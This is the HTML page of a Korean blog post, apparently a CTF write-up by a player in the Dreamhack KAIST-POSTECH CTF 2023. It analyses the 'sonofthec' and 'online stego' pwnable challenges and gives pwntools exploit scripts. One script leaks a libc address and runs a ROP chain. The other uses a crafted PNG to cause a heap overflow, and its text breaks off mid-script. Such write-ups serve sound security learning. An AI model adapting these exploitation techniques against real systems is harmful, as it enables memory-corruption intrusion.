<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Dreamhack Kaist Postech CTF | msh1307</title>
<meta name="keywords" content="Kaist Postech CTF, KAPO CTF">
<meta name="description" content="개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.
sonofthec Analysis 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.
read_secret(); args = json_object_object_get(json_obj, &#34;args&#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, &#34;username&#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/dreamhack_kaist_postech_ctf_2023/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Dreamhack Kaist Postech CTF" />
<meta property="og:description" content="개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.
sonofthec Analysis 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.
read_secret(); args = json_object_object_get(json_obj, &#34;args&#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, &#34;username&#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/dreamhack_kaist_postech_ctf_2023/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2023-12-20T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-12-20T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Dreamhack Kaist Postech CTF"/>
<meta name="twitter:description" content="개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.
sonofthec Analysis 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.
read_secret(); args = json_object_object_get(json_obj, &#34;args&#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, &#34;username&#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Dreamhack Kaist Postech CTF",
      "item": "https://msh1307.kr/blog/dreamhack_kaist_postech_ctf_2023/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Dreamhack Kaist Postech CTF",
  "name": "Dreamhack Kaist Postech CTF",
  "description": "개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.\nsonofthec Analysis 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.\nread_secret(); args = json_object_object_get(json_obj, \u0026#34;args\u0026#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;username\u0026#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object.",
  "keywords": [
    "Kaist Postech CTF", "KAPO CTF"
  ],
  "articleBody": "개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.\nsonofthec Analysis 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.\nread_secret(); args = json_object_object_get(json_obj, \"args\"); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \"username\"); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object.username); if ( usr_name_len \u003e 0x10 ) exit(0); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \"email\"); chk_string((__int64)STR); object.email = json_object_get_string(STR); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \"Car\"); chk_string((__int64)STR); object.Car = json_object_get_string(STR); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \"VIN\"); chk_string((__int64)STR); object.Vin = json_object_get_string(STR); std::allocator\u003cchar\u003e::allocator(vin); new_string(vin_1, (char *)object.Vin); std::allocator\u003cchar\u003e::~allocator(); std::string::basic_string((__int64)str, (__int64)vin_1); check_string_length((__int64)str); std::string::~string(str); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \"Company\"); chk_string((__int64)STR); object.Company = json_object_get_string(STR); v18 = std::chrono::_V2::system_clock::now(STR); initialize( // memleak. 0x10 sz username. (const char *)object.username, (const char *)object.email, (const char *)object.Car, (const char *)object.Vin, (const char *)object.Company); initialize_object(vin); std::allocator\u003cchar\u003e::allocator(v15); new_string(dreamhack_string, \"Dreamhack\"); v3 = setting_iss((__int64)vin, (__int64)dreamhack_string); std::allocator\u003cchar\u003e::allocator(\u0026v15[1]); new_string(v33, \"JWT\"); v4 = setting_typ(v3, (__int64)v33); *(_DWORD *)\u0026v16[8] = 30; sub_115E4(v19, (int *)\u0026v16[8]); v20 = sub_11607((__int64)\u0026v18, (__int64)v19); v5 = setting_exp(v4, (__int64)\u0026v20); std::allocator\u003cchar\u003e::allocator(\u0026v15[2]); new_string(usrname, (char *)object.username); set_data(\u0026data, (__int64)usrname); std::allocator\u003cchar\u003e::allocator(\u0026v15[3]); // allocator doesnt do anything. just a dummy function new_string(username_string, \"username\"); v6 = sub_117B0(v5, (__int64)username_string, \u0026data);// v31+8 -\u003e string_ptr std::allocator\u003cchar\u003e::allocator(\u0026v15[4]); new_string(a1, (char *)object.email); if ( username ) { v5 = strlen(username); strncpy((char *)ptr, username, v5); } if ( email ) { l = strlen(email); v7 = ptr; v7-\u003eemail = (__int64)malloc(l + 1); strcpy((char *)ptr-\u003eemail, email); } if ( car ) { l_1 = strlen(car); v9 = ptr; v9-\u003ecar = (__int64)malloc(l_1 + 1); strcpy((char *)ptr-\u003ecar, car); } if ( vin ) { v10 = strlen(vin); v11 = ptr; v11-\u003evin = (__int64)malloc(v10 + 1); strcpy((char *)ptr-\u003evin, vin); } if ( company ) 다음과 같이 여러 필드를 받으며, 이에 따라 JWT 토큰을 발급한다. initialize 함수에서 0x10 size로 검증한다. null terminated가 제대로 이루어지지 않을 수 있다. ptr에 저장된 객체가 참조되며 프린트된다면, memory leak이 발생할 수 있다. Hex-rays 상에선 보이지 않지만, graph view에선 실제로는 c++의 code level exception의 핸들러들도 구현이 되어있다. 만약 exception이 raise되면, exception에 따라 stack unwinding 등의 작업을 수행한다. v3 = json_object_object_get(obj, \"args\"); v4 = json_object_object_get(v3, \"token\"); chk_string(v4); if ( !v4 ) exit(-1); token = (char *)json_object_get_string(v4); if ( !token ) exit(-1); std::allocator\u003cchar\u003e::allocator((char *)\u0026v2 + 3); new_string(tok, token); std::allocator\u003cchar\u003e::~allocator(); std::string::operator=(\u0026current_token, tok); sub_F323((__int64)v7, (__int64)tok); sub_F40E((__int64)v8, (__int64)v7); verify((__int64)v8); // exception can be thrown here sub_F27A((__int64)v8); std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \"Login success\\n\"); sub_F27A((__int64)v7); std::string::~string(tok); return 0LL; jwt token을 입력으로 받아서 로그인을 수행한다.\nstd::allocator\u003cchar\u003e::allocator(\u0026v6); new_string(v12, \"Dreamhack\"); v2 = sub_11DCE(v1, (__int64)v12); std::allocator\u003cchar\u003e::allocator(\u0026v7); new_string(v13, \"Dreamhack\"); set_data(\u0026v9, (__int64)v13); std::allocator\u003cchar\u003e::allocator(v8); new_string(v14, \"Company\"); v3 = sub_11F76(v2, (__int64)v14, (__int64)\u0026v9); verify_0(v3, rdi0); std::string::~string(v14); std::allocator\u003cchar\u003e::~allocator(v8); sub_F350(\u0026v9); std::string::~string(v13); std::allocator\u003cchar\u003e::~allocator(\u0026v7); std::string::~string(v12); std::allocator\u003cchar\u003e::~allocator(\u0026v6); sub_F370((__int64)v15); std::string::~string(a1); std::allocator\u003cchar\u003e::~allocator(\u0026v5); sub_F10A((__int64)v10); priv_flag = 1; // if Exception Thrown, priv_flag = 0 return v16 - __readfsqword(0x28u); } verify 함수에서 priv_flag가 1이 되면 로그인에 성공하게 된다. 이때 JWT 토큰의 Company가 Dreamhack인지를 검증하게 되며, 아니라면 exception이 raise된다.\nv5 = __readfsqword(0x28u); sub_9E62((std::_V2 *)\u0026v3); sub_15EDC(a1, a2, (std::_V2 *)\u0026v3); sub_E470(v3, v4); return v5 - __readfsqword(0x28u); } result = sub_9FB6(\u0026v18); if ( (_BYTE)result ) { v3 = sub_CF54(); v4 = sub_9F24(\u0026v18); if ( (unsigned __int8)sub_9E44(v4, v3) ) { exception = __cxa_allocate_exception(0x20uLL); sub_E2FE(exception, (unsigned int)v18, v19); __cxa_throw(exception, (struct type_info *)\u0026typeinfo for'jwt::error::rsa_exception, sub_26EFC); } v6 = sub_D346(); v7 = sub_9F24(\u0026v18); if ( (unsigned __int8)sub_9E44(v7, v6) ) { v8 = __cxa_allocate_exception(0x20uLL); sub_E348(v8, (unsigned int)v18, v19); __cxa_throw(v8, (struct type_info *)\u0026`typeinfo for'jwt::error::ecdsa_exception, sub_26E9E); } v9 = sub_D78D(); v10 = sub_9F24(\u0026v18); if ( (unsigned __int8)sub_9E44(v10, v9) ) { v11 = __cxa_allocate_exception(0x20uLL); sub_E392(v11, (unsigned int)v18, v19); __cxa_throw(v11, (struct type_info *)\u0026typeinfo for'jwt::error::signature_verification_exception, sub_26FB8); } v12 = sub_DE33(); v13 = sub_9F24(\u0026v18); if ( (unsigned __int8)sub_9E44(v13, v12) ) { v14 = __cxa_allocate_exception(0x20uLL); sub_E3DC(v14, (unsigned int)v18, v19); __cxa_throw(v14, (struct type_info *)\u0026typeinfo for'jwt::error::signature_generation_exception, sub_26F5A); } v15 = sub_E231(); v16 = sub_9F24(\u0026v18); result = sub_9E44(v16, v15); if ( (_BYTE)result ) { v17 = __cxa_allocate_exception(0x20uLL); sub_E426(v17, (unsigned int)v18, v19); __cxa_throw(v17, (struct type_info *)\u0026typeinfo for'jwt::error::token_verification_exception, sub_26E40); } } return result; } 이때도 hex-rays 상에 보이지 않는 핸들러가 존재한다. 이때 priv_flag에 0이 대입된다. token status에서 jwt 토큰을 받고, 그 토큰에 대한 정보를 출력한다.\nExploitation new_string(v15, \"Company\"); v2 = sub_11F76(v1, (__int64)v15, \u0026v10); verify_0(v2, (__int64)v17); std::string::~string(v15); std::allocator\u003cchar\u003e::~allocator(); sub_F350(\u0026v10); std::string::~string(v14); std::allocator\u003cchar\u003e::~allocator(); std::string::~string(v13); std::allocator\u003cchar\u003e::~allocator(); sub_F370((__int64)v16); std::string::~string(a1); std::allocator\u003cchar\u003e::~allocator(); sub_F10A((__int64)v11); sub_120B8(v11, v17); v8 = v11; *(_QWORD *)\u0026v7[3] = sub_12184((__int64)v11); *(_QWORD *)\u0026v10.type = sub_121A2(v8); while ( !sub_121C0(\u0026v7[3], \u0026v10) ) { v9 = (char *)sub_12208(\u0026v7[3]); v3 = std::operator\u003c\u003c\u003cchar\u003e(\u0026std::cout, v9); v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(v3, \" = \"); v5 = sub_1222D(v4, (data *)v9 + 2); std::ostream::operator\u003c\u003c(v5, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); sub_121E6((__int64)\u0026v7[3]); } sub_F608((__int64)v11); sub_F27A((__int64)v17); 이때 문제는 memory leak은 파싱된 jwt의 body를 기준으로 출력하며, 내부적으로 key, value 형태의 오브젝트로 구현된다. register시에 initialize되어 null terminated string이 아니라, 파싱된 스트링을 jwt 토큰 제작에 이용하므로 memory leak이 절대 불가능하다. 하지만 Exception이 발생했을때 복구 로직에 구현 오류가 존재한다. exception 복구 로직은 진한 초록색으로 하이라이팅되어있는 부분이다. 이때 ptr이 참조되면서 복구 로직이 수행된다. 구현이 가용성에 초점이 맞춰져있어서 exception이 thrown되어도 정상처리를 가능케 해준다. 이를 악용하기 위해서는 JWT 토큰을 검증 시각에 invalidate하게 만들 필요가 있다.\nclock = std::chrono::_V2::system_clock::now(STR); ... new_string(v33, \"JWT\"); v4 = setting_typ(v3, (__int64)v33); *(_DWORD *)\u0026v16[8] = 30; sub_115E4(v19, (int *)\u0026v16[8]); v20 = sub_11607((__int64)\u0026clock, (__int64)v19); v5 = setting_exp(v4, (__int64)\u0026v20); v4 = *a1; v2 = ret_a1_1(\u0026v4); copy_obj(v5, a2); v6 = v2 + ret_a1_1(v5); set_result(v7, \u0026v6); return v7[0]; 마침 expire time이 30초이므로 그 시간을 sleep하고 token을 검증하면 invalidate 시킬 수 있고, 복구 로직에 의해서 memory가 leak된다.\nv5 = json_object_object_get(a1, \"args\"); v6 = json_object_object_get(v5, \"idx\"); if ( !v6 ) exit(-1); data = json_object_object_get(v5, \"data\"); v3 = ((__int64 (__fastcall *)(__int64))json_object_array_length)(v6); data_len = ((__int64 (__fastcall *)(__int64))json_object_array_length)(data); if ( v3 \u003e 0x10 ) exit(-1); for ( i = 0; data_len \u003e i; ++i ) { idx = json_object_array_get_idx(data, (int)i); if ( (unsigned int)((__int64 (__fastcall *)())json_object_get_type)() == json_type_int ) v9[i] = json_object_get_int64(idx); } bof가 있으니 rip control도 가능하다. canary는 int가 아닐때 write가 안되니 우회할 수 있다.\nExploit script from pwn import * import json sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) sl = lambda x : p.sendline(x) rvl = lambda : p.recvline() def dump(object): ret = b'{' l = len(object.keys()) i = 0 for it in object.keys(): if isinstance(object[it],dict): ret += b'\"' if isinstance(it, bytes): ret += it elif isinstance(it, str): ret += it.encode() else: raise Exception('unsupported type') ret += b'\" : ' ret += dump(object[it]) elif isinstance(object[it],bytes) or isinstance(object[it],str): ret += b'\"' if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception('unsupported type') ret += b'\" : \"' if isinstance(object[it],bytes): ret += object[it] else: ret += object[it].encode() ret += b'\"' elif isinstance(object[it],int): ret += b'\"' if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception('unsupported type') ret += b'\" : \"' + str(object[it]).encode() + b'\"' elif isinstance(object[it],list): ret += b'\"' if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception('unsupported type') val = b'[' for k in object[it]: if isinstance(k, int): val += str(k).encode() + b',' elif isinstance(k, str): val += b'\"' + k.encode() + b'\",' else: raise Exception('unsupported type') val = val[:-1] val += b']' ret += b'\" : ' + val else: raise Exception('unsupported type') i += 1 if i != l: ret += b',' ret += b'}' return ret def register(username, email, car, vin, company): a = { 'header':{ 'method':'register' }, 'args':{ 'username':username, 'email':email, 'Car':car, 'VIN':vin, 'Company':company, }, } # max vin 0x11,username 0x10 payload = dump(a) return payload def login(token): a = { 'header':{ 'method':'login' }, 'args' : { 'token' : token } } payload = dump(a) return payload def token_status(): a = { 'header':{ 'method':'token_status' }, } payload = dump(a) return payload def play(): a = { 'header':{ 'method':'play' }, } payload = dump(a) return payload def logout(token): a = { 'header':{ 'method':'logout' }, 'args':{ 'token' : token } } payload = dump(a) return payload def update(): a = { 'header':{ 'method':'logout' }, 'args':{ 'token' : token } } payload = dump(a) return payload def upload(data : list): a = { 'header':{ 'method':'upload' }, 'args':{ 'idx':[1,2,3], 'data': data } } payload = dump(a) return payload if __name__ == '__main__': # p = process('./sonofthec',env={'LD_PRELOAD':'./libc.so.6'}) p = remote('host3.dreamhack.games',8303) payload = register(b'A'*0x10,b'asdf',b'morning',b'A'*0x11,b'Dreamhack') # if company is not Dreamhack exception raised. print(payload) # pause() sl(payload) rv = json.loads(rvl()[:-1]) tok = rv['token'] payload = register(b'A'*0x10,b'asdf',b'morning',b'A'*0x11,b'Dreamhack') sl(payload) rv = json.loads(rvl()[:-1]) tok = rv['token'] payload = register(b'A'*0x8,b'asdf',b'morning',b'A'*0x11,b'Dreamhack') sl(payload) rv = json.loads(rvl()[:-1]) tok = rv['token'] payload = login(tok) print(payload) sl(payload) \\#leak success(\"sleeping 30s\") sleep(30) success('now token is expired memleak.') payload = token_status() context.log_level='debug' sl(payload) rvu(b'A'*8) libc_base = u64(rvl()[:-1].ljust(8,b'\\x00')) - 0x219df0 success(hex(libc_base)) # exp time = 30sec, so exception will be raised after 30s # if exception is thrown while proccessing JWT token validation, it traps and use ptr, a global variable to print things out so that they can print out some memory. # because this program frequently allocates mem and free, there's freed chunk in unsorted bin, once i reclaim it, i can get libc_base. payload = [1]*0x11 + [\"1\"] + [1]+ [libc_base + 0x000000000002a3e5, libc_base + 0x1d8698, libc_base + 0x0000000000029cd6,libc_base + 0x000000000050d60] payload = upload(payload) print(payload) pause() sl(payload) p.interactive() # 0000C139\t.plt.sec:___cxa_throw+4\tbnd jmp cs:__cxa_throw_ptr\tRAX=000055EBCC696A48 RDX=000055EBCC683FB8 RSI=000055EBCC696A48 RDI=000055EBCDE23EE0 # KAPO{js0n_C_w1th_jwt_t0ken_hs_256} online stego Analysis @app.route('/encode', methods=['POST']) def post_encode(): if 'png' not in request.files: abort(400) if 'msg' not in request.form: abort(400) png = request.files['png'] msg = request.form['msg'] if not validate_extension(png.filename): abort(400) filename = os.urandom(32).hex() + '.png' png.save(os.path.join(app.config['UPLOAD_DIR'], filename)) result = subprocess.check_output([STEGO_PATH, '-e', '-f', app.config['UPLOAD_DIR'] + '/' + filename, '-m', msg]) return render_template('encode_result.html', href=f'{result.decode()}') @app.route('/uploads/', methods=['GET']) def get_uploads(filename): return send_from_directory(UPLOAD_DIR, filename) @app.route('/decode', methods=['GET']) def get_decode(): return render_template('decode.html') @app.route('/decode', methods=['POST']) def post_decode(): if 'png' not in request.files: abort(400) png = request.files['png'] if not validate_extension(png.filename): abort(400) filename = os.urandom(32).hex() + '.png' png.save(os.path.join(app.config['UPLOAD_DIR'], filename)) result = subprocess.check_output([STEGO_PATH, '-d', '-f', app.config['UPLOAD_DIR'] + '/' + filename]) return render_template('decode_result.html', msg=f'{result.decode()}') 그냥 바이너리를 실행해서 출력한다.\n#!/bin/bash sysctl kernel.randomize_va_space=0 su chall -c \"export LC_ALL=C.UTF-8; export LANG=C.UTF-8; /bin/sh -c 'while true; do flask run -h 0.0.0.0 ; done'\" aslr이 꺼져있다.\nif ( de_flag != 2 ) { if ( de_flag == 1 ) decode(filename); fwrite(\"Error: Please specify either -d(decoding mode) or -e(encoding mode) option.\\n\", 1uLL, 0x4CuLL, stderr); exit(1); } encode(filename, message_content); return 0LL; png의 청크를 파싱하고, 메세지를 숨기거나 해독할 수 있다.\nstream = fopen(filename, \"r\"); ... v8 = fread(sig, 1uLL, 8uLL, stream); ... ihdr = parse_chunk(stream); if ( memcmp(\u0026ihdr-\u003etype, \"IHDR\", 4uLL) ) { fwrite(\"Error: chunk type mismatched\\n\", 1uLL, 0x1DuLL, stderr); exit(1); } master_node = set_node((__int64)ihdr); do { ihdr = parse_chunk(stream); v5 = set_node((__int64)ihdr); set_link(master_node, v5); // circular doubly linked } while ( memcmp(\u0026ihdr-\u003etype, \"IEND\", 4uLL) ); // scan while IEND v4 = ftell(stream); fseek(stream, 0LL, 2); v1 = ftell(stream); if ( v4 != v1 ) { fwrite(\"Error: wrong footer\\n\", 1uLL, 0x14uLL, stderr); exit(1); 다음과 같이 청크를 파싱한다. parsechunk 함수는 다음과 같다.\nv8 = (chunk *)malloc(0x20uLL); read = fread(\u0026sz, 1uLL, 4uLL, a1); ... sz = conv_big2little(sz); read = fread(\u0026tpye, 1uLL, 4uLL, a1); ... mem = malloc((unsigned __int16)sz); if ( !mem ) { fwrite(\"Error: malloc()\\n\", 1uLL, 0x10uLL, stderr); exit(1); } read = fread(mem, 1uLL, sz, a1); ... read = fread(\u0026crc, 1uLL, 4uLL, a1); if ( read \u003c= 3 ) { fwrite(\"Error: fread()\\n\", 1uLL, 0xFuLL, stderr); exit(1); } crc = conv_big2little(crc); v5 = crc32(0xFFFFFFFF, (__int64)\u0026tpye, 4u); v5 = ~(unsigned int)crc32(v5, (__int64)mem, sz); if ( v5 != crc ) { fwrite(\"Error: crc mismatched\\n\", 1uLL, 0x16uLL, stderr); exit(1); } v8-\u003elength = sz; v8-\u003etype = tpye; v8-\u003epayload = (__int64)mem; v8-\u003ecrc = crc; return v8; heap overflow가 발생한다.\nnode *__fastcall set_link(node *master_node, node *new_node) { node *result; // rax node *fd; // [rsp+18h] [rbp-8h] fd = master_node-\u003efd; fd-\u003ebk = new_node; master_node-\u003efd = new_node; new_node-\u003ebk = master_node; result = new_node; new_node-\u003efd = fd; return result; } 이런식으로 circular doubly linked list로 연결되어있다.\nfor ( master_node = (node *)parse(a1); ; pop(master_node) ) { node = get_current_node(master_node); l_ptr = (uint *)\u0026node-\u003elength; if ( !memcmp(\u0026node-\u003etype, \"iTXt\", 4uLL) \u0026\u0026 !memcmp(\u0026node-\u003epayload-\u003ehdr, secret_hdr, 4uLL) ) break; } if ( *l_ptr \u003c= 8 ) { fwrite(\"Error: unable to decode\\n\", 1uLL, 0x18uLL, stderr); exit(1); } secret_msg_length = *l_ptr - 8; p_secret_msg = \u0026node-\u003epayload-\u003esecret_msg; malloc(2 * (__int16)*l_ptr); // sign extension if ( v2 ) // uninitiaized stack var iTXt에 메세지를 암호화하고, decode는 iTXt에서 메세지를 해독한다.\nprev = master_node-\u003efd; cur = master_node-\u003efd-\u003efd; // real current node next = cur-\u003efd; next-\u003ebk = master_node-\u003efd; prev-\u003efd = next; free(cur-\u003epayload); free(cur); 노드를 unlink하는데, 약간 이상하다. masternode→fd→fd로 돌게된다.\nfor ( master_node = (node *)parse(a1); ; pop(master_node) ) { node = get_current_node(master_node); l_ptr = (uint *)\u0026node-\u003elength; if ( !memcmp(\u0026node-\u003etype, \"iTXt\", 4uLL) \u0026\u0026 !memcmp(\u0026node-\u003epayload-\u003ehdr, secret_hdr, 4uLL) ) break; } Exploitation 루프를 돌면서 로직 버그가 발생하며, free되면서 chunk_payload + 0x0에는 next freed 청크가 들어가기 때문에, 유저가 다음 노드를 조작할 수 있게 된다. 노드가 적다면, DFB를 트리거할 수 있지만, glibc 2.27의 검증 때문에 불가하다. 노드를 너무 늘리면 결국 singly linked list 형태로 bin에 쌓여서 NULL로 끝나게 되고, 순회하기 충분치 않아 null pointer dereference가 발생하여 DOS로 끝난다. 처음부터 top chunk를 덮으면 원하는 메모리 할당이 가능해진다.\nmalloc(2 * (__int16)*l_ptr); // sign extension if ( v2 ) // uninitiaized stack var s = (sec_msg_hdr *)v2; else s = node-\u003epayload; r = (char *)malloc(4uLL); if ( !r ) { fwrite(\"Error: malloc()\\n\", 1uLL, 0x10uLL, stderr); exit(1); } *(_DWORD *)r = *(_DWORD *)node-\u003epayload; recover(s-\u003emsg, r, (char *)p_secret_msg, secret_msg_length); 이후 해독을 진행한다.\nExploit script from pwn import * def calc_crc(chunk:bytes) -\u003e int: sz = u32(chunk[:4],endian='big') def crc(init : int , asdf : bytes, l : int): v3 = 0 for i in range(l): init ^= asdf[i] for j in range(8): if (init \u0026 1): v3 = 0xEDB88320 else: v3 = 0 init = (init\u003e\u003e1) ^ v3 return init v5 = crc(0xffffffff, chunk[4:8], 4) v5 = ~(crc(v5, chunk[8:],sz)) return v5 def gen_chunk(data_length, type : bytes, data : bytes): payload = b'' payload += p32(data_length,endian='big') payload += type payload += data crc = calc_crc(payload) \u0026 0xffffffff payload += p32(crc,endian='big') return payload # (a1 \u003e\u003e 8) \u0026 0xFF00 | (a1 \u003c\u003c 8) \u0026 0xFF0000 | (a1 \u003c\u003c 24) | HIBYTE(a1); # a1[2]\u003e\u003e8 | a[1]\u003c\u003c8 | a1[0] \u003c\u003c 24 | a[3] \u003e\u003e 24 # because chunks are linked as a circular doubly linked list, with enough freed chunks u can trigger DFB # glibc 2.27 has tcache-\u003ekey validation. no dfb # masternode -\u003e node3 -\u003e node2 -\u003e node1 # masternode -\u003e fd -\u003e fd == current node # masternode -\u003e fd == prev node # masternode -\u003e fd -\u003e fd -\u003e fd == next node # unlink , pop # matsernode -\u003e fd -\u003e fd -\u003e fd -\u003e bk = masternode -\u003e fd # masternode -\u003e fd -\u003e fd = masternode -\u003e fd -\u003e fd -\u003e fd # free payload # free node # trigger1 # payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) # payload += gen_chunk(0x20, b'IHDR', b'A'*0x20) # chunk = b'' # chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3 # chunk += p32(0) # chunk += p32(0x378) # chunk += b'iTXt' # chunk += b'A'*(0x28 - len(chunk)) # chunk += p64(0x7fffffffd7fc-4) # payload += gen_chunk(0x30, b'NOD2', chunk) # payload += gen_chunk(0x30, b'NOD1', bytes([0xCA, 0xFE, 0xCA, 0xFE])*2*2*3) # payload += gen_chunk(0x30, b'IEND', p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b'B'*0x10) # trigger2 heapoverflow payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) pay = b'' pay += b'A'*(0xf8-len(pay)) pay += p64(0xffffffffffffffff) pay += b'B'*(0x100f8-len(pay)) payload += gen_chunk(0x100f8,b'IHDR',pay) chunk = b'' chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3 chunk += p32(0) chunk += p32(0xffffec58+0x10-0x20) # size chunk += b'iTXt' chunk += p32(0x400CC7) chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE]) # hdr for payload ptr chunk += b'C'*(0x28 - len(chunk)) chunk += p64(0x6045bc) # payload ptr payload += gen_chunk(0x30, b'NOD2', chunk) payload += gen_chunk(0x30, b'NOD1', b'A'*0x30) payload += gen_chunk(0x30, b'IEND', p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b'B'*0x10) # payload -\u003e asdf ptr with 